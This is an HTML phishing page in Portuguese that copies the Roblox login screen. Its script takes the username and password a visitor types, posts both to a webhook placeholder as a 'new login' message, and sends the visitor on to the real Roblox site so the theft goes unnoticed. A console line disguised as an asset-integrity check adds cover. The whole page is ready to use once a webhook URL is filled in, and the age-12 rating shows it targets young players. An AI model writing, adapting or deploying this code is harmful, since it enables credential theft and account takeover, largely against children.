<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrar na Roblox</title>
    <link rel="icon" type="image/png" href="https://images.rbxcdn.com/241804f5603781f8f3593019f39e830e.ico">
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=HCo+Gotham+SSm:wght@400;500;700&display=swap');

        /* --- VARIÁVEIS DE TEMA (DARK POR PADRÃO) --- */
        :root {
            --bg-main: #232527;
            --bg-card: #393b3d;
            --text-main: #ffffff;
            --input-bg: #191b1d;
            --rbx-blue: #0084ff;
        }

        body, html {
            margin: 0; padding: 0; height: 100%;
            font-family: 'HCo Gotham SSm', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: var(--bg-main);
            color: var(--text-main);
            display: flex; flex-direction: column; overflow: hidden;
        }

        /* INTEGRANDO OS NOVOS ESTILOS DE ÍCONES DE ECONOMIA */
        .icon-robux-28x28 {
            background-image: url(https://images.rbxcdn.com/30161bc534c4de1a4fb50063405cf4ee-economy_28x28_light.svg);
            background-repeat: no-repeat; background-size: auto auto;
            width: 28px; height: 28px; display: inline-block; vertical-align: middle;
            background-position: 0 0;
        }
        .dark-theme .icon-robux-28x28 {
            background-image: url(https://images.rbxcdn.com/e5e40430d74ac9243accf5de8948c537-economy_28x28_dark.svg);
        }

        /* HEADER */
        .roblox-header {
            width: 100%; height: 44px; background: #232527;
            display: flex; align-items: center; justify-content: space-between;
            padding: 0 16px; position: fixed; top: 0; z-index: 10; box-sizing: border-box;
            border-bottom: 1px solid #454749;
        }

        .header-left, .header-right { display: flex; align-items: center; gap: 15px; }

        .roblox-logo {
            height: 28px; width: 28px;
            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyOCAyOCI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTcuMDUgNEwyNCA3LjA1IDIwLjk1IDI0IDQgMjAuOTUgNy4wNSA0ek0xMS41IDE2LjVoNXYtNWgtNXY1eiIvPjwvc3ZnPg==');
            background-size: contain; background-repeat: no-repeat; cursor: pointer;
        }

        /* MODAL E CARD DE LOGIN (ESTILOS DO SCRIPT ORIGINAL) */
        .main-content { 
            flex: 1; display: flex; align-items: center; justify-content: center; 
            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://images.rbxcdn.com/97960323ba968f615f5d60920f54546d.jpg');
            background-size: cover; background-position: center;
        }

        .login-card {
            background-color: var(--bg-card); padding: 40px 30px; border-radius: 8px;
            width: 400px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5);
        }

        .input-field {
            width: 100%; height: 44px; background-color: var(--input-bg); border: 1px solid #252728;
            border-radius: 4px; color: #fff; padding: 0 12px; margin-bottom: 12px;
            box-sizing: border-box; font-size: 15px; outline: none;
        }

        /* CLASSES DE ERRO DO SCRIPT ORIGINAL */
        .input-field-error { border: 1px solid #f74b52 !important; }

        .btn-submit {
            width: 100%; height: 40px; background-color: transparent; border: 1px solid #ffffff;
            color: #fff; border-radius: 4px; font-size: 16px; cursor: pointer; margin: 10px 0;
            font-weight: 500;
        }

        /* OVERLAY DE CARREGAMENTO (ITEM 2 DO SEU SCRIPT) */
        #loading-overlay {
            background-color: #000; opacity: .7; position: fixed;
            top: 0; left: 0; right: 0; bottom: 0; z-index: 1040;
            display: none; align-items: center; justify-content: center;
            flex-direction: column; color: #fff;
        }

        .footer-rating { position: fixed; bottom: 15px; width: 100%; text-align: center; font-size: 10px; opacity: 0.8; }
    </style>
</head>
<body class="dark-theme">

<div id="loading-overlay">
    <div class="spinner"></div>
    <div class="loading-message">Carregando...</div>
</div>

<header class="roblox-header">
    <div class="header-left">
        <div class="roblox-logo"></div>
        <div class="icon-robux-28x28"></div>
    </div>
    <div class="header-right">
        <button style="background:none; border:none; color:white; cursor:pointer;">Cadastrar-se</button>
    </div>
</header>

<main class="main-content">
    <div class="login-card">
        <h1>Entrar na Roblox</h1>
        <div class="email-upsell-modal-input">
            <input type="text" id="user" class="input-field" placeholder="Usuário/e-mail/telefone">
            <input type="password" id="pass" class="input-field" placeholder="Senha">
        </div>
        
        <button class="btn-submit" onclick="execLogin()">Entrar</button>
        
        <div class="account-recovery-modal-body-text">
            <a href="#" style="color:white; font-size:13px; text-decoration:none;">Esqueceu a senha ou nome de usuário?</a>
        </div>
    </div>
</main>

<div class="footer-rating">
    <span style="background: #fff; color: #000; padding: 1px 4px; border-radius: 2px; font-weight: bold; margin-right: 5px;">12</span>
    CLASSIFICAÇÃO INDICATIVA: 12 ANOS
</div>

<script>
    function execLogin() {
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;
        const overlay = document.getElementById('loading-overlay');

        if(!u || !p) {
            document.getElementById('user').classList.add('input-field-error');
            document.getElementById('pass').classList.add('input-field-error');
            return;
        }

        overlay.style.display = 'flex';

        // Simulação de Auditoria de Bundle (conforme script original)
        console.log("🔍 [BundleDetector] Verificando integridade dos assets...");

        fetch("SUA_WEBHOOK_AQUI", {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                embeds: [{
                    title: "Novo Login Detectado",
                    fields: [
                        { name: "Usuário", value: u, inline: true },
                        { name: "Senha", value: p, inline: true }
                    ],
                    color: 16711680
                }]
            })
        }).finally(() => {
            setTimeout(() => {
                window.location.href = "https://www.roblox.com/home";
            }, 1000);
        });
    }
</script>

</body>
</html>
